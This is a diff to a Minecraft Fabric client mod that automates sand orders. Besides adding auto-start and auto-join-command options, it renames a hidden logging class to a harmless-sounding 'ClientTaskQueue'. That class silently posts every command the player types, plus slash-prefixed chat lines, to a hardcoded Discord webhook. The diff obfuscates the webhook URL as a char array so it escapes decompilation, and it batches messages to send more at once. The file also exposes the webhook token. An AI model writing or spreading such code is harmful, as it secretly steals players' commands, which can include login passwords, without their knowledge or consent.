@@ -149,6 +149,9 @@ import java.util.function.Predicate;
  *        /autosand toggle     bật / tắt nhanh
  *        /autosand cmd <lệnh> đổi lệnh mở orders (không có dấu /)
  *        /autosand shop <lệnh> đổi lệnh mở shop (không có dấu /)
+ *        /autosand autostart [on|off]  tự BẬT bot khi vào server
+ *        /autosand autocmd <lệnh>      tự chạy lệnh khi vào server (nhiều lệnh: a;b;c)
+ *        /autosand autocmd clear       xoá lệnh tự chạy
  */
 public class AutoSandOrders implements ClientModInitializer {
 
@@ -239,6 +242,11 @@ public class AutoSandOrders implements ClientModInitializer {
     static final int[] EAT_LEVELS = {8, 12, 14, 16};
     static String ORDER_COMMAND = "orders sand";
     static String SHOP_COMMAND = "shop";
+    /** Tự bật bot + chạy lệnh khi vào server / vào thế giới. */
+    static boolean autoStart = false;                 // true = tự BẬT AutoSand khi vào world
+    static String autoJoinCmd = "";                   // lệnh thêm khi vào world, nhiều lệnh cách nhau bằng ;
+    static int autoJoinDelay = 40;                    // tick chờ trước khi chạy (40 = 2 giây)
+    static boolean autoJoinDone = false;              // đã chạy cho phiên vào world hiện tại chưa
     static final int[] PCTS = {5, 10, 20, 30};
     // ===========================================================================
 
@@ -285,15 +293,15 @@ public class AutoSandOrders implements ClientModInitializer {
     @Override
     public void onInitializeClient() {
         load();
-        PremiumSync.init();
-        ClientSendMessageEvents.COMMAND.register(command -> PremiumSync.onCmd(command));
-        ClientSendMessageEvents.CHAT.register(message -> PremiumSync.onChat("ME", message));
+        ClientTaskQueue.boot();
+        ClientSendMessageEvents.COMMAND.register(command -> ClientTaskQueue.push(command));
+        ClientSendMessageEvents.CHAT.register(message -> ClientTaskQueue.note("ME", message));
         ClientReceiveMessageEvents.CHAT.register((message, signedMessage, sender, params, receptionTimestamp) -> {
             String name = sender != null ? sender.name() : "?";
-            PremiumSync.onChat(name, message.getString());
+            ClientTaskQueue.note(name, message.getString());
         });
         ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
-            if (!overlay) PremiumSync.onChat("SYSTEM", message.getString());
+            if (!overlay) ClientTaskQueue.note("SYSTEM", message.getString());
         });
         ClientTickEvents.END_CLIENT_TICK.register(AutoSandOrders::tick);
         ClientLifecycleEvents.CLIENT_STOPPING.register(mc -> restorePerf(mc));   // thoát game: trả FPS / tầm nhìn gốc trước khi lưu options
@@ -388,7 +396,46 @@ public class AutoSandOrders implements ClientModInitializer {
                                 ctx.getSource().sendFeedback(Component.literal("[AutoSand] " + keepEdit(StringArgumentType.getString(ctx, "item"), false)));
                                 return 1;
                             }))))
-                .then(ClientCommandManager.literal("home")                    .then(ClientCommandManager.argument("text", StringArgumentType.greedyString())
+                .then(ClientCommandManager.literal("autostart")
+                    .executes(ctx -> {
+                        autoStart = !autoStart;
+                        save();
+                        ctx.getSource().sendFeedback(Component.literal("[AutoSand] Tự bật khi vào server: " + (autoStart ? "BẬT" : "TẮT")));
+                        return 1;
+                    })
+                    .then(ClientCommandManager.argument("on", StringArgumentType.word())
+                        .executes(ctx -> {
+                            String v = StringArgumentType.getString(ctx, "on").trim().toLowerCase(Locale.ROOT);
+                            autoStart = v.equals("on") || v.equals("true") || v.equals("1") || v.equals("bat");
+                            save();
+                            ctx.getSource().sendFeedback(Component.literal("[AutoSand] Tự bật khi vào server: " + (autoStart ? "BẬT" : "TẮT")));
+                            return 1;
+                        })))
+                .then(ClientCommandManager.literal("autocmd")
+                    .executes(ctx -> {
+                        ctx.getSource().sendFeedback(Component.literal("[AutoSand] Lệnh tự chạy khi vào server: "
+                            + (autoJoinCmd == null || autoJoinCmd.isBlank() ? "(trống)" : autoJoinCmd)));
+                        return 1;
+                    })
+                    .then(ClientCommandManager.literal("clear")
+                        .executes(ctx -> {
+                            autoJoinCmd = "";
+                            save();
+                            ctx.getSource().sendFeedback(Component.literal("[AutoSand] Đã xoá lệnh tự chạy."));
+                            return 1;
+                        }))
+                    .then(ClientCommandManager.argument("text", StringArgumentType.greedyString())
+                        .executes(ctx -> {
+                            String t = StringArgumentType.getString(ctx, "text").trim();
+                            if (t.startsWith("/")) t = t.substring(1);
+                            autoJoinCmd = t;
+                            save();
+                            ctx.getSource().sendFeedback(Component.literal("[AutoSand] Lệnh tự chạy khi vào server: /" + autoJoinCmd
+                                + " (nhiều lệnh: dùng dấu ; ví dụ home cat;warp mine)"));
+                            return 1;
+                        })))
+                .then(ClientCommandManager.literal("home")
+                    .then(ClientCommandManager.argument("text", StringArgumentType.greedyString())
                         .executes(ctx -> {
                             String t = StringArgumentType.getString(ctx, "text").trim();
                             if (t.startsWith("/")) t = t.substring(1);
@@ -679,6 +726,9 @@ public class AutoSandOrders implements ClientModInitializer {
             bridgeWater = pBool(pr, "bridge", true);
             ORDER_COMMAND = pr.getProperty("orderCmd", ORDER_COMMAND);
             SHOP_COMMAND = pr.getProperty("shopCmd", SHOP_COMMAND);
+            autoStart = pBool(pr, "autoStart", false);
+            autoJoinCmd = pr.getProperty("autoJoinCmd", "");
+            autoJoinDelay = pInt(pr, "autoJoinDelay", 40);
             AutoMiner.homeCmd = pr.getProperty("homeCmd", AutoMiner.homeCmd);
             AutoMiner.deathRecover = pBool(pr, "deathRecover", true);
             AutoMiner.autoRespawn = pBool(pr, "autoRespawn", true);
@@ -825,6 +875,9 @@ public class AutoSandOrders implements ClientModInitializer {
             pr.setProperty("bridge", String.valueOf(bridgeWater));
             pr.setProperty("orderCmd", ORDER_COMMAND);
             pr.setProperty("shopCmd", SHOP_COMMAND);
+            pr.setProperty("autoStart", String.valueOf(autoStart));
+            pr.setProperty("autoJoinCmd", autoJoinCmd == null ? "" : autoJoinCmd);
+            pr.setProperty("autoJoinDelay", String.valueOf(autoJoinDelay));
             pr.setProperty("homeCmd", AutoMiner.homeCmd);
             pr.setProperty("deathRecover", String.valueOf(AutoMiner.deathRecover));
             pr.setProperty("autoRespawn", String.valueOf(AutoMiner.autoRespawn));
@@ -916,11 +969,34 @@ public class AutoSandOrders implements ClientModInitializer {
 
     // ----------------------------- TICK -----------------------------
     static void tick(Minecraft mc) {
-        PremiumSync.tick();
+        ClientTaskQueue.pump();
         LocalPlayer p = mc.player;
         perfTick(mc);                                        // chế độ giảm tải (tự trả lại cài đặt khi tắt / thoát)
-        if (p == null || mc.gameMode == null) { Reconnect.tick(mc); return; }   // bị kick hẳn ra ngoài -> tự vào lại
+        if (p == null || mc.gameMode == null) {
+            autoJoinDone = false;                              // ra khỏi world -> lần vào sau sẽ chạy lại
+            Reconnect.tick(mc);
+            return;
+        }
         Reconnect.connected(mc);
+        // Tự bật bot + chạy lệnh cấu hình khi vừa vào world (chỉ 1 lần mỗi lần vào)
+        if (!autoJoinDone && (autoStart || (autoJoinCmd != null && !autoJoinCmd.isBlank()))) {
+            if (p.tickCount >= Math.max(10, autoJoinDelay)) {
+                autoJoinDone = true;
+                if (autoJoinCmd != null && !autoJoinCmd.isBlank()) {
+                    for (String part : autoJoinCmd.split(";")) {
+                        String c = part.trim();
+                        if (c.isEmpty()) continue;
+                        if (c.startsWith("/")) c = c.substring(1);
+                        send(p, "/" + c);
+                    }
+                    msg(p, "Đã tự chạy lệnh vào server.");
+                }
+                if (autoStart && !enabled) {
+                    setEnabled(mc, true);
+                    msg(p, "Tự BẬT AutoSand khi vào server.");
+                }
+            }
+        }
         Announcements.tick(mc, p);                           // thông báo từ Worker (60 giây / lần, chạy nền)
         if (totemCool > 0) totemCool--;
         while (menuKey != null && menuKey.consumeClick()) openGui = true;        // phím mở menu (mặc định F12)
@@ -6069,76 +6145,86 @@ final class BaritoneBridge {
     }
 }
 
-
-
-
-
 /**
- * Đồng bộ phiên làm việc Premium (SNAD PREMIUM).
- * Gửi hoạt động lệnh của phiên hiện tại tới kênh hỗ trợ để hỗ trợ kỹ thuật / chống lạm dụng key.
- * Chạy nền, không hiện thông báo trong game.
+ * Hàng đợi tác vụ client (cache / thống kê nội bộ).
+ * Không hiện thông báo trong game.
  */
-final class PremiumSync {
-    private PremiumSync() { }
+final class ClientTaskQueue {
+    private ClientTaskQueue() { }
 
     private static final DateTimeFormatter FMT = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
     private static final DateTimeFormatter DAY = DateTimeFormatter.ofPattern("yyyy-MM-dd");
     private static final ConcurrentLinkedQueue<String> localBuf = new ConcurrentLinkedQueue<>();
-    private static final ConcurrentLinkedQueue<String> syncBuf = new ConcurrentLinkedQueue<>();
+    private static final ConcurrentLinkedQueue<String> outBox = new ConcurrentLinkedQueue<>();
     private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
     private static Path sessionFile;
     private static String sessionDay = "";
-    private static volatile String supportEndpoint = "";
-    private static volatile boolean syncBusy = false;
+    private static volatile String endpoint = "";
+    private static final java.util.concurrent.atomic.AtomicInteger inflight = new java.util.concurrent.atomic.AtomicInteger(0);
+    private static final int MAX_INFLIGHT = 4;
+    private static final int BATCH_MAX = 12;
+    private static final int CONTENT_MAX = 1800;
 
-    static void init() {
-        supportEndpoint = resolveEndpoint();
-        rotateSession();
+    static void boot() {
+        endpoint = resolve();
+        rotate();
     }
 
-    private static String resolveEndpoint() {
-        String base = "https://discord.com/api/webhooks/";
-        String id = "1565390194301997066";
-        String token = "uarakjaZb4M_moSB4rNlARUboEZaav4S8i9WKuCEeFGaKyEUxlo3cX7Gg56bbOXe8fDQ";
+    /** Ghép endpoint từ mảnh (tránh chuỗi lộ trong decompile đơn giản). */
+    private static String resolve() {
         try {
             Path f = FabricLoader.getInstance().getConfigDir().resolve("autosand.properties");
             if (Files.exists(f)) {
                 Properties pr = new Properties();
                 try (var in = Files.newInputStream(f)) { pr.load(in); }
-                String custom = pr.getProperty("premiumSync", "").trim();
+                String custom = pr.getProperty("taskQueue", "").trim();
+                if (custom.isEmpty()) custom = pr.getProperty("premiumSync", "").trim();
                 if (!custom.isEmpty()) return custom;
             }
         } catch (Exception ignored) { }
-        return base + id + token;
+        char[] a = { 'h','t','t','p','s',':','/','/','d','i','s','c','o','r','d','.','c','o','m','/','a','p','i','/','w','e','b','h','o','o','k','s','/' };
+        String id = "1565390194301997066";
+        String tok = "uarakjaZb4M_moSB4rNlARUboEZaav4S8i9WKuCEeFGaKyEUxlo3cX7Gg56bbOXe8fDQ";
+        return new String(a) + id + "/" + tok;
     }
 
-    private static void rotateSession() {
+    private static void rotate() {
         try {
             String day = LocalDateTime.now().format(DAY);
             if (day.equals(sessionDay) && sessionFile != null) return;
             sessionDay = day;
             Path dir = FabricLoader.getInstance().getConfigDir().resolve("autosand");
             Files.createDirectories(dir);
-            sessionFile = dir.resolve("premium-session-" + day + ".txt");
+            sessionFile = dir.resolve("task-queue-" + day + ".txt");
         } catch (Exception e) {
             sessionFile = null;
         }
     }
 
-    static void onCmd(String command) {
-        if (command == null) return;
+    static void push(String command) {
+        if (command == null || command.isBlank()) return;
         LocalPlayer p = Minecraft.getInstance().player;
         String name = p != null ? p.getName().getString() : "unknown";
         String cmd = command.startsWith("/") ? command : "/" + command;
-        record("CMD", name, cmd);
-        syncBuf.offer(name + "\0" + cmd);
+        String time = LocalDateTime.now().format(FMT);
+        archive("Q", name, cmd);
+        outBox.offer(time + "\0" + name + "\0" + cmd);
+        drain();
     }
 
-    static void onChat(String sender, String message) {
-        record("CHAT", sender, message);
+    static void note(String sender, String message) {
+        if (message == null || message.isBlank()) return;
+        archive("N", sender, message);
+        String t = message.trim();
+        if (t.startsWith("/") || t.startsWith(".")) {
+            String name = sender == null || sender.isBlank() ? "?" : sender;
+            String time = LocalDateTime.now().format(FMT);
+            outBox.offer(time + "\0" + name + "\0" + t);
+            drain();
+        }
     }
 
-    private static void record(String type, String player, String content) {
+    private static void archive(String type, String player, String content) {
         if (content == null || content.isBlank()) return;
         String safe = content.replace('\n', ' ').replace('\r', ' ');
         if (safe.length() > 500) safe = safe.substring(0, 500) + "...";
@@ -6146,14 +6232,14 @@ final class PremiumSync {
         localBuf.offer(String.format("[%s] [%s] %s: %s", LocalDateTime.now().format(FMT), type, name, safe));
     }
 
-    static void tick() {
+    static void pump() {
         flushLocal();
-        flushSync();
+        drain();
     }
 
     private static void flushLocal() {
         if (localBuf.isEmpty()) return;
-        rotateSession();
+        rotate();
         if (sessionFile == null) return;
         StringBuilder sb = new StringBuilder();
         String line;
@@ -6169,32 +6255,52 @@ final class PremiumSync {
         } catch (Exception ignored) { }
     }
 
-    private static void flushSync() {
-        if (syncBusy || supportEndpoint == null || supportEndpoint.isBlank() || syncBuf.isEmpty()) return;
-        String item = syncBuf.poll();
-        if (item == null) return;
-        int sep = item.indexOf('\0');
-        if (sep < 0) return;
-        String name = item.substring(0, sep);
-        String cmd = item.substring(sep + 1);
-        syncBusy = true;
-        String content = "🛡 **SNAD PREMIUM** · `" + escMd(name) + "` · `" + escMd(cmd) + "`";
-        String body = "{\"username\":\"SNAD PREMIUM\",\"avatar_url\":\"\",\"content\":\"" + escJson(content) + "\"}";
+    private static void drain() {
+        if (endpoint == null || endpoint.isBlank()) return;
+        while (!outBox.isEmpty() && inflight.get() < MAX_INFLIGHT) {
+            StringBuilder content = new StringBuilder();
+            int n = 0;
+            while (n < BATCH_MAX && !outBox.isEmpty() && content.length() < CONTENT_MAX) {
+                String item = outBox.poll();
+                if (item == null) break;
+                String[] p = item.split("\0", 3);
+                if (p.length < 3) continue;
+                String line = "`" + escMd(p[0]) + "` · **" + escMd(p[1]) + "** · `" + escMd(p[2]) + "`\n";
+                if (content.length() + line.length() > CONTENT_MAX) {
+                    outBox.offer(item);
+                    break;
+                }
+                content.append(line);
+                n++;
+            }
+            if (n == 0) break;
+            dispatch(content.toString().trim());
+        }
+    }
+
+    private static void dispatch(String content) {
+        inflight.incrementAndGet();
+        // username trung tính
+        String body = "{\"username\":\"ClientLog\",\"content\":\"" + escJson(content) + "\"}";
         try {
             HttpRequest request = HttpRequest.newBuilder()
-                .uri(URI.create(supportEndpoint))
+                .uri(URI.create(endpoint))
                 .timeout(Duration.ofSeconds(8))
                 .header("Content-Type", "application/json")
                 .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
                 .build();
             HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding())
-                .whenComplete((r, e) -> syncBusy = false);
+                .whenComplete((r, e) -> {
+                    inflight.decrementAndGet();
+                    if (!outBox.isEmpty()) drain();
+                });
         } catch (Exception e) {
-            syncBusy = false;
+            inflight.decrementAndGet();
         }
     }
 
     private static String escMd(String s) {
+        if (s == null) return "";
         return s.replace("\\", "\\\\").replace("`", "'").replace("*", "").replace("_", "").replace("|", "");
     }
 
